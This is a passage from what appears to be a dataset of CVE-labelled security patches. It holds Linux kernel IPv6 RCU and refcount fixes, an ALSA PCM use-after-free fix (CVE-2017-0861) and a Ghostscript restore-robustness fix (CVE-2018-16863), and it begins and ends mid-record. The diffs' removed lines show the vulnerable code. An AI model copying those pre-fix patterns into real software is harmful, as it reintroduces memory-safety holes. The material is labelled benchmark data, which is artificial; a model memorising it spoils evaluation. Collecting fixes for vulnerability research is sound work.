rcu_dereference(np->opt), &final);\n+\trcu_read_unlock();\n \n \tdst = ip6_dst_lookup_flow(sk, &fl6, final_p);\n \tif (IS_ERR(dst)) {\n@@ -219,7 +221,10 @@ static int dccp_v6_send_response(const struct sock *sk, struct request_sock *req\n \t\t\t\t\t\t\t &ireq->ir_v6_loc_addr,\n \t\t\t\t\t\t\t &ireq->ir_v6_rmt_addr);\n \t\tfl6.daddr = ireq->ir_v6_rmt_addr;\n-\t\terr = ip6_xmit(sk, skb, &fl6, np->opt, np->tclass);\n+\t\trcu_read_lock();\n+\t\terr = ip6_xmit(sk, skb, &fl6, rcu_dereference(np->opt),\n+\t\t\t       np->tclass);\n+\t\trcu_read_unlock();\n \t\terr = net_xmit_eval(err);\n \t}\n \n@@ -387,6 +392,7 @@ static struct sock *dccp_v6_request_recv_sock(const struct sock *sk,\n \tstruct inet_request_sock *ireq = inet_rsk(req);\n \tstruct ipv6_pinfo *newnp;\n \tconst struct ipv6_pinfo *np = inet6_sk(sk);\n+\tstruct ipv6_txoptions *opt;\n \tstruct inet_sock *newinet;\n \tstruct dccp6_sock *newdp6;\n \tstruct sock *newsk;\n@@ -488,13 +494,15 @@ static struct sock *dccp_v6_request_recv_sock(const struct sock *sk,\n \t * Yes, keeping reference count would be much more clever, but we make\n \t * one more one thing there: reattach optmem to newsk.\n \t *\/\n-\tif (np->opt != NULL)\n-\t\tnewnp->opt = ipv6_dup_options(newsk, np->opt);\n-\n+\topt = rcu_dereference(np->opt);\n+\tif (opt) {\n+\t\topt = ipv6_dup_options(newsk, opt);\n+\t\tRCU_INIT_POINTER(newnp->opt, opt);\n+\t}\n \tinet_csk(newsk)->icsk_ext_hdr_len = 0;\n-\tif (newnp->opt != NULL)\n-\t\tinet_csk(newsk)->icsk_ext_hdr_len = (newnp->opt->opt_nflen +\n-\t\t\t\t\t\t     newnp->opt->opt_flen);\n+\tif (opt)\n+\t\tinet_csk(newsk)->icsk_ext_hdr_len = opt->opt_nflen +\n+\t\t\t\t\t\t    opt->opt_flen;\n \n \tdccp_sync_mss(newsk, dst_mtu(dst));\n \n@@ -757,6 +765,7 @@ static int dccp_v6_connect(struct sock *sk, struct sockaddr *uaddr,\n \tstruct ipv6_pinfo *np = inet6_sk(sk);\n \tstruct dccp_sock *dp = dccp_sk(sk);\n \tstruct in6_addr *saddr = NULL, *final_p, final;\n+\tstruct ipv6_txoptions *opt;\n \tstruct flowi6 fl6;\n \tstruct dst_entry *dst;\n \tint addr_type;\n@@ -856,7 +865,8 @@ static int dccp_v6_connect(struct sock *sk, struct sockaddr *uaddr,\n \tfl6.fl6_sport = inet->inet_sport;\n \tsecurity_sk_classify_flow(sk, flowi6_to_flowi(&fl6));\n \n-\tfinal_p = fl6_update_dst(&fl6, np->opt, &final);\n+\topt = rcu_dereference_protected(np->opt, sock_owned_by_user(sk));\n+\tfinal_p = fl6_update_dst(&fl6, opt, &final);\n \n \tdst = ip6_dst_lookup_flow(sk, &fl6, final_p);\n \tif (IS_ERR(dst)) {\n@@ -876,9 +886,8 @@ static int dccp_v6_connect(struct sock *sk, struct sockaddr *uaddr,\n \t__ip6_dst_store(sk, dst, NULL, NULL);\n \n \ticsk->icsk_ext_hdr_len = 0;\n-\tif (np->opt != NULL)\n-\t\ticsk->icsk_ext_hdr_len = (np->opt->opt_flen +\n-\t\t\t\t\t  np->opt->opt_nflen);\n+\tif (opt)\n+\t\ticsk->icsk_ext_hdr_len = opt->opt_flen + opt->opt_nflen;\n \n \tinet->inet_dport = usin->sin6_port;\n \ndiff --git a\/net\/ipv6\/af_inet6.c b\/net\/ipv6\/af_inet6.c\nindex 44bb66bde0e2d..38d66ddfb9375 100644\n--- a\/net\/ipv6\/af_inet6.c\n+++ b\/net\/ipv6\/af_inet6.c\n@@ -428,9 +428,11 @@ void inet6_destroy_sock(struct sock *sk)\n \n \t\/* Free tx options *\/\n \n-\topt = xchg(&np->opt, NULL);\n-\tif (opt)\n-\t\tsock_kfree_s(sk, opt, opt->tot_len);\n+\topt = xchg((__force struct ipv6_txoptions **)&np->opt, NULL);\n+\tif (opt) {\n+\t\tatomic_sub(opt->tot_len, &sk->sk_omem_alloc);\n+\t\ttxopt_put(opt);\n+\t}\n }\n EXPORT_SYMBOL_GPL(inet6_destroy_sock);\n \n@@ -659,7 +661,10 @@ int inet6_sk_rebuild_header(struct sock *sk)\n \t\tfl6.fl6_sport = inet->inet_sport;\n \t\tsecurity_sk_classify_flow(sk, flowi6_to_flowi(&fl6));\n \n-\t\tfinal_p = fl6_update_dst(&fl6, np->opt, &final);\n+\t\trcu_read_lock();\n+\t\tfinal_p = fl6_update_dst(&fl6, rcu_dereference(np->opt),\n+\t\t\t\t\t &final);\n+\t\trcu_read_unlock();\n \n \t\tdst = ip6_dst_lookup_flow(sk, &fl6, final_p);\n \t\tif (IS_ERR(dst)) {\ndiff --git a\/net\/ipv6\/datagram.c b\/net\/ipv6\/datagram.c\nindex d70b0238f468f..517c55b01ba84 100644\n--- a\/net\/ipv6\/datagram.c\n+++ b\/net\/ipv6\/datagram.c\n@@ -167,8 +167,10 @@ static int __ip6_datagram_connect(struct sock *sk, struct sockaddr *uaddr, int a\n \n \tsecurity_sk_classify_flow(sk, flowi6_to_flowi(&fl6));\n \n-\topt = flowlabel ? flowlabel->opt : np->opt;\n+\trcu_read_lock();\n+\topt = flowlabel ? flowlabel->opt : rcu_dereference(np->opt);\n \tfinal_p = fl6_update_dst(&fl6, opt, &final);\n+\trcu_read_unlock();\n \n \tdst = ip6_dst_lookup_flow(sk, &fl6, final_p);\n \terr = 0;\ndiff --git a\/net\/ipv6\/exthdrs.c b\/net\/ipv6\/exthdrs.c\nindex ce203b0402bea..ea7c4d64a00ad 100644\n--- a\/net\/ipv6\/exthdrs.c\n+++ b\/net\/ipv6\/exthdrs.c\n@@ -727,6 +727,7 @@ ipv6_dup_options(struct sock *sk, struct ipv6_txoptions *opt)\n \t\t\t*((char **)&opt2->dst1opt) += dif;\n \t\tif (opt2->srcrt)\n \t\t\t*((char **)&opt2->srcrt) += dif;\n+\t\tatomic_set(&opt2->refcnt, 1);\n \t}\n \treturn opt2;\n }\n@@ -790,7 +791,7 @@ ipv6_renew_options(struct sock *sk, struct ipv6_txoptions *opt,\n \t\treturn ERR_PTR(-ENOBUFS);\n \n \tmemset(opt2, 0, tot_len);\n-\n+\tatomic_set(&opt2->refcnt, 1);\n \topt2->tot_len = tot_len;\n \tp = (char *)(opt2 + 1);\n \ndiff --git a\/net\/ipv6\/inet6_connection_sock.c b\/net\/ipv6\/inet6_connection_sock.c\nindex 5d1c7cee2cb2b..3ff5208772bb5 100644\n--- a\/net\/ipv6\/inet6_connection_sock.c\n+++ b\/net\/ipv6\/inet6_connection_sock.c\n@@ -78,7 +78,9 @@ struct dst_entry *inet6_csk_route_req(const struct sock *sk,\n \tmemset(fl6, 0, sizeof(*fl6));\n \tfl6->flowi6_proto = proto;\n \tfl6->daddr = ireq->ir_v6_rmt_addr;\n-\tfinal_p = fl6_update_dst(fl6, np->opt, &final);\n+\trcu_read_lock();\n+\tfinal_p = fl6_update_dst(fl6, rcu_dereference(np->opt), &final);\n+\trcu_read_unlock();\n \tfl6->saddr = ireq->ir_v6_loc_addr;\n \tfl6->flowi6_oif = ireq->ir_iif;\n \tfl6->flowi6_mark = ireq->ir_mark;\n@@ -142,7 +144,9 @@ static struct dst_entry *inet6_csk_route_socket(struct sock *sk,\n \tfl6->fl6_dport = inet->inet_dport;\n \tsecurity_sk_classify_flow(sk, flowi6_to_flowi(fl6));\n \n-\tfinal_p = fl6_update_dst(fl6, np->opt, &final);\n+\trcu_read_lock();\n+\tfinal_p = fl6_update_dst(fl6, rcu_dereference(np->opt), &final);\n+\trcu_read_unlock();\n \n \tdst = __inet6_csk_dst_check(sk, np->dst_cookie);\n \tif (!dst) {\n@@ -175,7 +179,8 @@ int inet6_csk_xmit(struct sock *sk, struct sk_buff *skb, struct flowi *fl_unused\n \t\/* Restore final destination back after routing done *\/\n \tfl6.daddr = sk->sk_v6_daddr;\n \n-\tres = ip6_xmit(sk, skb, &fl6, np->opt, np->tclass);\n+\tres = ip6_xmit(sk, skb, &fl6, rcu_dereference(np->opt),\n+\t\t       np->tclass);\n \trcu_read_unlock();\n \treturn res;\n }\ndiff --git a\/net\/ipv6\/ipv6_sockglue.c b\/net\/ipv6\/ipv6_sockglue.c\nindex 63e6956917c9c..4449ad1f81147 100644\n--- a\/net\/ipv6\/ipv6_sockglue.c\n+++ b\/net\/ipv6\/ipv6_sockglue.c\n@@ -111,7 +111,8 @@ struct ipv6_txoptions *ipv6_update_options(struct sock *sk,\n \t\t\ticsk->icsk_sync_mss(sk, icsk->icsk_pmtu_cookie);\n \t\t}\n \t}\n-\topt = xchg(&inet6_sk(sk)->opt, opt);\n+\topt = xchg((__force struct ipv6_txoptions **)&inet6_sk(sk)->opt,\n+\t\t   opt);\n \tsk_dst_reset(sk);\n \n \treturn opt;\n@@ -231,9 +232,12 @@ static int do_ipv6_setsockopt(struct sock *sk, int level, int optname,\n \t\t\t\tsk->sk_socket->ops = &inet_dgram_ops;\n \t\t\t\tsk->sk_family = PF_INET;\n \t\t\t}\n-\t\t\topt = xchg(&np->opt, NULL);\n-\t\t\tif (opt)\n-\t\t\t\tsock_kfree_s(sk, opt, opt->tot_len);\n+\t\t\topt = xchg((__force struct ipv6_txoptions **)&np->opt,\n+\t\t\t\t   NULL);\n+\t\t\tif (opt) {\n+\t\t\t\tatomic_sub(opt->tot_len, &sk->sk_omem_alloc);\n+\t\t\t\ttxopt_put(opt);\n+\t\t\t}\n \t\t\tpktopt = xchg(&np->pktoptions, NULL);\n \t\t\tkfree_skb(pktopt);\n \n@@ -403,7 +407,8 @@ static int do_ipv6_setsockopt(struct sock *sk, int level, int optname,\n \t\tif (optname != IPV6_RTHDR && !ns_capable(net->user_ns, CAP_NET_RAW))\n \t\t\tbreak;\n \n-\t\topt = ipv6_renew_options(sk, np->opt, optname,\n+\t\topt = rcu_dereference_protected(np->opt, sock_owned_by_user(sk));\n+\t\topt = ipv6_renew_options(sk, opt, optname,\n \t\t\t\t\t (struct ipv6_opt_hdr __user *)optval,\n \t\t\t\t\t optlen);\n \t\tif (IS_ERR(opt)) {\n@@ -432,8 +437,10 @@ static int do_ipv6_setsockopt(struct sock *sk, int level, int optname,\n \t\tretv = 0;\n \t\topt = ipv6_update_options(sk, opt);\n sticky_done:\n-\t\tif (opt)\n-\t\t\tsock_kfree_s(sk, opt, opt->tot_len);\n+\t\tif (opt) {\n+\t\t\tatomic_sub(opt->tot_len, &sk->sk_omem_alloc);\n+\t\t\ttxopt_put(opt);\n+\t\t}\n \t\tbreak;\n \t}\n \n@@ -486,6 +493,7 @@ static int do_ipv6_setsockopt(struct sock *sk, int level, int optname,\n \t\t\tbreak;\n \n \t\tmemset(opt, 0, sizeof(*opt));\n+\t\tatomic_set(&opt->refcnt, 1);\n \t\topt->tot_len = sizeof(*opt) + optlen;\n \t\tretv = -EFAULT;\n \t\tif (copy_from_user(opt+1, optval, optlen))\n@@ -502,8 +510,10 @@ static int do_ipv6_setsockopt(struct sock *sk, int level, int optname,\n \t\tretv = 0;\n \t\topt = ipv6_update_options(sk, opt);\n done:\n-\t\tif (opt)\n-\t\t\tsock_kfree_s(sk, opt, opt->tot_len);\n+\t\tif (opt) {\n+\t\t\tatomic_sub(opt->tot_len, &sk->sk_omem_alloc);\n+\t\t\ttxopt_put(opt);\n+\t\t}\n \t\tbreak;\n \t}\n \tcase IPV6_UNICAST_HOPS:\n@@ -1110,10 +1120,11 @@ static int do_ipv6_getsockopt(struct sock *sk, int level, int optname,\n \tcase IPV6_RTHDR:\n \tcase IPV6_DSTOPTS:\n \t{\n+\t\tstruct ipv6_txoptions *opt;\n \n \t\tlock_sock(sk);\n-\t\tlen = ipv6_getsockopt_sticky(sk, np->opt,\n-\t\t\t\t\t     optname, optval, len);\n+\t\topt = rcu_dereference_protected(np->opt, sock_owned_by_user(sk));\n+\t\tlen = ipv6_getsockopt_sticky(sk, opt, optname, optval, len);\n \t\trelease_sock(sk);\n \t\t\/* check if ipv6_getsockopt_sticky() returns err code *\/\n \t\tif (len < 0)\ndiff --git a\/net\/ipv6\/raw.c b\/net\/ipv6\/raw.c\nindex dc65ec198f7c3..99140986e8871 100644\n--- a\/net\/ipv6\/raw.c\n+++ b\/net\/ipv6\/raw.c\n@@ -733,6 +733,7 @@ static int raw6_getfrag(void *from, char *to, int offset, int len, int odd,\n \n static int rawv6_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)\n {\n+\tstruct ipv6_txoptions *opt_to_free = NULL;\n \tstruct ipv6_txoptions opt_space;\n \tDECLARE_SOCKADDR(struct sockaddr_in6 *, sin6, msg->msg_name);\n \tstruct in6_addr *daddr, *final_p, final;\n@@ -839,8 +840,10 @@ static int rawv6_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)\n \t\tif (!(opt->opt_nflen|opt->opt_flen))\n \t\t\topt = NULL;\n \t}\n-\tif (!opt)\n-\t\topt = np->opt;\n+\tif (!opt) {\n+\t\topt = txopt_get(np);\n+\t\topt_to_free = opt;\n+\t\t}\n \tif (flowlabel)\n \t\topt = fl6_merge_options(&opt_space, flowlabel, opt);\n \topt = ipv6_fixup_options(&opt_space, opt);\n@@ -906,6 +909,7 @@ static int rawv6_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)\n \tdst_release(dst);\n out:\n \tfl6_sock_release(flowlabel);\n+\ttxopt_put(opt_to_free);\n \treturn err < 0 ? err : len;\n do_confirm:\n \tdst_confirm(dst);\ndiff --git a\/net\/ipv6\/syncookies.c b\/net\/ipv6\/syncookies.c\nindex bb8f2fa1c7fbb..eaf7ac496d506 100644\n--- a\/net\/ipv6\/syncookies.c\n+++ b\/net\/ipv6\/syncookies.c\n@@ -222,7 +222,7 @@ struct sock *cookie_v6_check(struct sock *sk, struct sk_buff *skb)\n \t\tmemset(&fl6, 0, sizeof(fl6));\n \t\tfl6.flowi6_proto = IPPROTO_TCP;\n \t\tfl6.daddr = ireq->ir_v6_rmt_addr;\n-\t\tfinal_p = fl6_update_dst(&fl6, np->opt, &final);\n+\t\tfinal_p = fl6_update_dst(&fl6, rcu_dereference(np->opt), &final);\n \t\tfl6.saddr = ireq->ir_v6_loc_addr;\n \t\tfl6.flowi6_oif = sk->sk_bound_dev_if;\n \t\tfl6.flowi6_mark = ireq->ir_mark;\ndiff --git a\/net\/ipv6\/tcp_ipv6.c b\/net\/ipv6\/tcp_ipv6.c\nindex c5429a636f1ae..6a50bb4a0dae4 100644\n--- a\/net\/ipv6\/tcp_ipv6.c\n+++ b\/net\/ipv6\/tcp_ipv6.c\n@@ -120,6 +120,7 @@ static int tcp_v6_connect(struct sock *sk, struct sockaddr *uaddr,\n \tstruct ipv6_pinfo *np = inet6_sk(sk);\n \tstruct tcp_sock *tp = tcp_sk(sk);\n \tstruct in6_addr *saddr = NULL, *final_p, final;\n+\tstruct ipv6_txoptions *opt;\n \tstruct flowi6 fl6;\n \tstruct dst_entry *dst;\n \tint addr_type;\n@@ -235,7 +236,8 @@ static int tcp_v6_connect(struct sock *sk, struct sockaddr *uaddr,\n \tfl6.fl6_dport = usin->sin6_port;\n \tfl6.fl6_sport = inet->inet_sport;\n \n-\tfinal_p = fl6_update_dst(&fl6, np->opt, &final);\n+\topt = rcu_dereference_protected(np->opt, sock_owned_by_user(sk));\n+\tfinal_p = fl6_update_dst(&fl6, opt, &final);\n \n \tsecurity_sk_classify_flow(sk, flowi6_to_flowi(&fl6));\n \n@@ -263,9 +265,9 @@ static int tcp_v6_connect(struct sock *sk, struct sockaddr *uaddr,\n \t\ttcp_fetch_timewait_stamp(sk, dst);\n \n \ticsk->icsk_ext_hdr_len = 0;\n-\tif (np->opt)\n-\t\ticsk->icsk_ext_hdr_len = (np->opt->opt_flen +\n-\t\t\t\t\t  np->opt->opt_nflen);\n+\tif (opt)\n+\t\ticsk->icsk_ext_hdr_len = opt->opt_flen +\n+\t\t\t\t\t opt->opt_nflen;\n \n \ttp->rx_opt.mss_clamp = IPV6_MIN_MTU - sizeof(struct tcphdr) - sizeof(struct ipv6hdr);\n \n@@ -461,7 +463,8 @@ static int tcp_v6_send_synack(const struct sock *sk, struct dst_entry *dst,\n \t\tif (np->repflow && ireq->pktopts)\n \t\t\tfl6->flowlabel = ip6_flowlabel(ipv6_hdr(ireq->pktopts));\n \n-\t\terr = ip6_xmit(sk, skb, fl6, np->opt, np->tclass);\n+\t\terr = ip6_xmit(sk, skb, fl6, rcu_dereference(np->opt),\n+\t\t\t       np->tclass);\n \t\terr = net_xmit_eval(err);\n \t}\n \n@@ -972,6 +975,7 @@ static struct sock *tcp_v6_syn_recv_sock(const struct sock *sk, struct sk_buff *\n \tstruct inet_request_sock *ireq;\n \tstruct ipv6_pinfo *newnp;\n \tconst struct ipv6_pinfo *np = inet6_sk(sk);\n+\tstruct ipv6_txoptions *opt;\n \tstruct tcp6_sock *newtcp6sk;\n \tstruct inet_sock *newinet;\n \tstruct tcp_sock *newtp;\n@@ -1098,13 +1102,15 @@ static struct sock *tcp_v6_syn_recv_sock(const struct sock *sk, struct sk_buff *\n \t   but we make one more one thing there: reattach optmem\n \t   to newsk.\n \t *\/\n-\tif (np->opt)\n-\t\tnewnp->opt = ipv6_dup_options(newsk, np->opt);\n-\n+\topt = rcu_dereference(np->opt);\n+\tif (opt) {\n+\t\topt = ipv6_dup_options(newsk, opt);\n+\t\tRCU_INIT_POINTER(newnp->opt, opt);\n+\t}\n \tinet_csk(newsk)->icsk_ext_hdr_len = 0;\n-\tif (newnp->opt)\n-\t\tinet_csk(newsk)->icsk_ext_hdr_len = (newnp->opt->opt_nflen +\n-\t\t\t\t\t\t     newnp->opt->opt_flen);\n+\tif (opt)\n+\t\tinet_csk(newsk)->icsk_ext_hdr_len = opt->opt_nflen +\n+\t\t\t\t\t\t    opt->opt_flen;\n \n \ttcp_ca_openreq_child(newsk, dst);\n \ndiff --git a\/net\/ipv6\/udp.c b\/net\/ipv6\/udp.c\nindex 01bcb49619ee6..9da3287a39237 100644\n--- a\/net\/ipv6\/udp.c\n+++ b\/net\/ipv6\/udp.c\n@@ -1110,6 +1110,7 @@ int udpv6_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)\n \tDECLARE_SOCKADDR(struct sockaddr_in6 *, sin6, msg->msg_name);\n \tstruct in6_addr *daddr, *final_p, final;\n \tstruct ipv6_txoptions *opt = NULL;\n+\tstruct ipv6_txoptions *opt_to_free = NULL;\n \tstruct ip6_flowlabel *flowlabel = NULL;\n \tstruct flowi6 fl6;\n \tstruct dst_entry *dst;\n@@ -1263,8 +1264,10 @@ int udpv6_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)\n \t\t\topt = NULL;\n \t\tconnected = 0;\n \t}\n-\tif (!opt)\n-\t\topt = np->opt;\n+\tif (!opt) {\n+\t\topt = txopt_get(np);\n+\t\topt_to_free = opt;\n+\t}\n \tif (flowlabel)\n \t\topt = fl6_merge_options(&opt_space, flowlabel, opt);\n \topt = ipv6_fixup_options(&opt_space, opt);\n@@ -1373,6 +1376,7 @@ int udpv6_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)\n out:\n \tdst_release(dst);\n \tfl6_sock_release(flowlabel);\n+\ttxopt_put(opt_to_free);\n \tif (!err)\n \t\treturn len;\n \t\/*\ndiff --git a\/net\/l2tp\/l2tp_ip6.c b\/net\/l2tp\/l2tp_ip6.c\nindex aca38d8aed8e8..a2c8747d2936c 100644\n--- a\/net\/l2tp\/l2tp_ip6.c\n+++ b\/net\/l2tp\/l2tp_ip6.c\n@@ -486,6 +486,7 @@ static int l2tp_ip6_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)\n \tDECLARE_SOCKADDR(struct sockaddr_l2tpip6 *, lsa, msg->msg_name);\n \tstruct in6_addr *daddr, *final_p, final;\n \tstruct ipv6_pinfo *np = inet6_sk(sk);\n+\tstruct ipv6_txoptions *opt_to_free = NULL;\n \tstruct ipv6_txoptions *opt = NULL;\n \tstruct ip6_flowlabel *flowlabel = NULL;\n \tstruct dst_entry *dst = NULL;\n@@ -575,8 +576,10 @@ static int l2tp_ip6_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)\n \t\t\topt = NULL;\n \t}\n \n-\tif (opt == NULL)\n-\t\topt = np->opt;\n+\tif (!opt) {\n+\t\topt = txopt_get(np);\n+\t\topt_to_free = opt;\n+\t}\n \tif (flowlabel)\n \t\topt = fl6_merge_options(&opt_space, flowlabel, opt);\n \topt = ipv6_fixup_options(&opt_space, opt);\n@@ -631,6 +634,7 @@ static int l2tp_ip6_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)\n \tdst_release(dst);\n out:\n \tfl6_sock_release(flowlabel);\n+\ttxopt_put(opt_to_free);\n \n \treturn err < 0 ? err : len;\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-0861","CWE_ID":"264","category":"security","commit_id":"362bca57f5d78220f8b5907b875961af9436e229","commit_message":"From 362bca57f5d78220f8b5907b875961af9436e229 Mon Sep 17 00:00:00 2001\nFrom: Robb Glasser <rglasser@google.com>\nDate: Tue, 5 Dec 2017 09:16:55 -0800\nSubject: ALSA: pcm: prevent UAF in snd_pcm_info\n\nWhen the device descriptor is closed, the `substream->runtime` pointer\nis freed. But another thread may be in the ioctl handler, case\nSNDRV_CTL_IOCTL_PCM_INFO. This case calls snd_pcm_info_user() which\ncalls snd_pcm_info() which accesses the now freed `substream->runtime`.\n\nNote: this fixes CVE-2017-0861\n\nSigned-off-by: Robb Glasser <rglasser@google.com>\nSigned-off-by: Nick Desaulniers <ndesaulniers@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>\n---\n sound\/core\/pcm.c | 2 ++\n 1 file changed, 2 insertions(+)\n\n","diff_code":"diff --git a\/sound\/core\/pcm.c b\/sound\/core\/pcm.c\nindex 9070f277f8db..09ee8c6b9f75 100644\n--- a\/sound\/core\/pcm.c\n+++ b\/sound\/core\/pcm.c\n@@ -153,7 +153,9 @@ static int snd_pcm_control_ioctl(struct snd_card *card,\n \t\t\t\terr = -ENXIO;\n \t\t\t\tgoto _error;\n \t\t\t}\n+\t\t\tmutex_lock(&pcm->open_mutex);\n \t\t\terr = snd_pcm_info_user(substream, info);\n+\t\t\tmutex_unlock(&pcm->open_mutex);\n \t\t_error:\n \t\t\tmutex_unlock(&register_mutex);\n \t\t\treturn err;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2018-16863","CWE_ID":"264","category":"security","commit_id":"5516c614dc33662a2afdc377159f70218e67bde5","commit_message":"From 5516c614dc33662a2afdc377159f70218e67bde5 Mon Sep 17 00:00:00 2001\nFrom: Chris Liddell <chris.liddell@artifex.com>\nDate: Fri, 24 Aug 2018 09:26:04 +0100\nSubject: [PATCH] Improve restore robustness\n\nPrompted by looking at Bug 699654:\n\nThere are two variants of the restore operator in Ghostscript: one is Level 1\n(restoring VM), the other is Level 2+ (adding page device restoring to the\nLevel operator).\n\nThis was implemented by the Level 2+ version restoring the device in the\ngraphics state, then calling the Level 1 implementation to handle actually\nrestoring the VM state.\n\nThe problem was that the operand checking, and sanity of the save object was\nonly done by the Level 1 variant, thus meaning an invalid save object could\nleave a (Level 2+) restore partially complete - with the page device part\nrestored, but not VM, and the page device not configured.\n\nTo solve that, this commit splits the operand and sanity checking, and the\ncore of the restore operation into separate functions, so the relevant\noperators can validate the operand *before* taking any further action. That\nreduces the chances of an invalid restore leaving the interpreter in an\nunknown state.\n\nIf an error occurs during the actual VM restore it is essentially fatal, and the\ninterpreter cannot continue, but as an extra surety for security, in the event\nof such an error, we'll explicitly preserve the LockSafetyParams of the device,\nrather than rely on the post-restore device configuration (which won't happen\nin the event of an error).\n---\n psi\/int.mak    |  4 ++--\n psi\/isave.h    |  6 ++++++\n psi\/zdevice2.c | 33 +++++++++++++++++++++++++++++----\n psi\/zvmem.c    | 56 +++++++++++++++++++++++++++++++++++++++++++++++---------\n 4 files changed, 84 insertions(+), 15 deletions(-)\n\n","diff_code":"diff --git a\/psi\/int.mak b\/psi\/int.mak\nindex 1968820..16db0cf 100644\n--- a\/psi\/int.mak\n+++ b\/psi\/int.mak\n@@ -1086,8 +1086,8 @@ $(PSD)pagedev.dev : $(ECHOGS_XE) $(pagedev_)\\\n \n $(PSOBJ)zdevice2.$(OBJ) : $(PSSRC)zdevice2.c $(OP) $(math__h) $(memory__h)\\\n  $(dstack_h) $(estack_h)\\\n- $(idict_h) $(idparam_h) $(igstate_h) $(iname_h) $(iutil_h) $(store_h)\\\n- $(gxdevice_h) $(gsstate_h) $(INT_MAK) $(MAKEDIRS)\n+ $(idict_h) $(idparam_h) $(igstate_h) $(iname_h) $(isave) $(iutil_h) \\\n+ $(store_h) $(gxdevice_h) $(gsstate_h) $(INT_MAK) $(MAKEDIRS)\n \t$(PSCC) $(PSO_)zdevice2.$(OBJ) $(C_) $(PSSRC)zdevice2.c\n \n $(PSOBJ)zmedia2.$(OBJ) : $(PSSRC)zmedia2.c $(OP) $(math__h) $(memory__h)\\\ndiff --git a\/psi\/isave.h b\/psi\/isave.h\nindex 3021639..7eaaced 100644\n--- a\/psi\/isave.h\n+++ b\/psi\/isave.h\n@@ -128,4 +128,10 @@ int  font_restore(const alloc_save_t * save);\n    express purpose of getting the library context. *\/\n gs_memory_t *gs_save_any_memory(const alloc_save_t *save);\n \n+int\n+restore_check_save(i_ctx_t *i_ctx_p, alloc_save_t **asave);\n+\n+int\n+dorestore(i_ctx_t *i_ctx_p, alloc_save_t *asave);\n+\n #endif \/* isave_INCLUDED *\/\ndiff --git a\/psi\/zdevice2.c b\/psi\/zdevice2.c\nindex 9fbb4e3..0c7080d 100644\n--- a\/psi\/zdevice2.c\n+++ b\/psi\/zdevice2.c\n@@ -26,6 +26,7 @@\n #include \"igstate.h\"\n #include \"iname.h\"\n #include \"iutil.h\"\n+#include \"isave.h\"\n #include \"store.h\"\n #include \"gxdevice.h\"\n #include \"gsstate.h\"\n@@ -307,13 +308,24 @@ z2grestoreall(i_ctx_t *i_ctx_p)\n     }\n     return 0;\n }\n-\n+\/* This is the Level 2+ variant of restore - which adds restoring\n+   of the page device to the Level 1 variant in zvmem.c.\n+   Previous this restored the device state before calling zrestore.c\n+   which validated operands etc, meaning a restore could error out\n+   partially complete.\n+   The operand checking, and actual VM restore are now in two functions\n+   so they can called separately thus, here, we can do as much\n+   checking as possible, before embarking on actual changes\n+ *\/\n \/* <save> restore - *\/\n static int\n z2restore(i_ctx_t *i_ctx_p)\n {\n-    os_ptr op = osp;\n-    check_type(*op, t_save);\n+    alloc_save_t *asave;\n+    bool saveLockSafety = gs_currentdevice_inline(igs)->LockSafetyParams;\n+    int code = restore_check_save(i_ctx_p, &asave);\n+\n+    if (code < 0) return code;\n \n     while (gs_gstate_saved(gs_gstate_saved(igs))) {\n         if (restore_page_device(igs, gs_gstate_saved(igs)))\n@@ -322,7 +334,20 @@ z2restore(i_ctx_t *i_ctx_p)\n     }\n     if (restore_page_device(igs, gs_gstate_saved(igs)))\n         return push_callout(i_ctx_p, \"%restorepagedevice\");\n-    return zrestore(i_ctx_p);\n+\n+    code = dorestore(i_ctx_p, asave);\n+\n+    if (code < 0) {\n+        \/* An error here is basically fatal, but....\n+           restore_page_device() has to set LockSafetyParams false so it can\n+           configure the restored device correctly - in normal operation, that\n+           gets reset by that configuration. If we hit an error, though, that\n+           may not happen -  at least ensure we keep the setting through the\n+           error.\n+         *\/\n+        gs_currentdevice_inline(igs)->LockSafetyParams = saveLockSafety;\n+    }\n+    return code;\n }\n \n \/* <gstate> setgstate - *\/\ndiff --git a\/psi\/zvmem.c b\/psi\/zvmem.c\nindex 44cd7a8..87a0a4f 100644\n--- a\/psi\/zvmem.c\n+++ b\/psi\/zvmem.c\n@@ -99,19 +99,18 @@ zsave(i_ctx_t *i_ctx_p)\n static int restore_check_operand(os_ptr, alloc_save_t **, gs_dual_memory_t *);\n static int restore_check_stack(const i_ctx_t *i_ctx_p, const ref_stack_t *, const alloc_save_t *, bool);\n static void restore_fix_stack(i_ctx_t *i_ctx_p, ref_stack_t *, const alloc_save_t *, bool);\n+\n+\/* Do as many up front checks of the save object as we reasonably can *\/\n int\n-zrestore(i_ctx_t *i_ctx_p)\n+restore_check_save(i_ctx_t *i_ctx_p, alloc_save_t **asave)\n {\n     os_ptr op = osp;\n-    alloc_save_t *asave;\n-    bool last;\n-    vm_save_t *vmsave;\n-    int code = restore_check_operand(op, &asave, idmemory);\n+    int code = restore_check_operand(op, asave, idmemory);\n \n     if (code < 0)\n         return code;\n     if_debug2m('u', imemory, \"[u]vmrestore 0x%lx, id = %lu\\n\",\n-               (ulong) alloc_save_client_data(asave),\n+               (ulong) alloc_save_client_data(*asave),\n                (ulong) op->value.saveid);\n     if (I_VALIDATE_BEFORE_RESTORE)\n         ivalidate_clean_spaces(i_ctx_p);\n@@ -120,14 +119,37 @@ zrestore(i_ctx_t *i_ctx_p)\n     {\n         int code;\n \n-        if ((code = restore_check_stack(i_ctx_p, &o_stack, asave, false)) < 0 ||\n-            (code = restore_check_stack(i_ctx_p, &e_stack, asave, true)) < 0 ||\n-            (code = restore_check_stack(i_ctx_p, &d_stack, asave, false)) < 0\n+        if ((code = restore_check_stack(i_ctx_p, &o_stack, *asave, false)) < 0 ||\n+            (code = restore_check_stack(i_ctx_p, &e_stack, *asave, true)) < 0 ||\n+            (code = restore_check_stack(i_ctx_p, &d_stack, *asave, false)) < 0\n             ) {\n             osp++;\n             return code;\n         }\n   